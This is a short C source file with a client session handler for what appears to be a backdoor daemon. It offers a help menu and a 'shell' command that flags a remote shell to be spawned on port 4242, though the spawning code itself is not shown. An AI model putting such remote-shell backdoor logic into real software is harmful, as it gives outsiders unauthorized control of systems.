#include "ft_shield.h"

int	session_step(t_client *c)
{
	char	line[MAX_LINE + 1];
	ssize_t	n;

	n = read_line(c->fd, line, MAX_LINE);
	if (n <= 0)
		return (-1);
	if (strcmp(line, "?") == 0)
	{
		send_str(c->fd, "? show help\n");
		send_str(c->fd, "shell spawn remote shell on 4242\n");
		send_str(c->fd, "exit close session\n$> ");
		return (0);
	}
	if (strcmp(line, "shell") == 0)
	{
		g_pending_shell = 1;
		send_str(c->fd, "Spawning shell on port 4242\n");
		return (-1);
	}
	if (strcmp(line, "exit") == 0)
		return (-1);
	send_str(c->fd, "$> ");
	return (0);
}
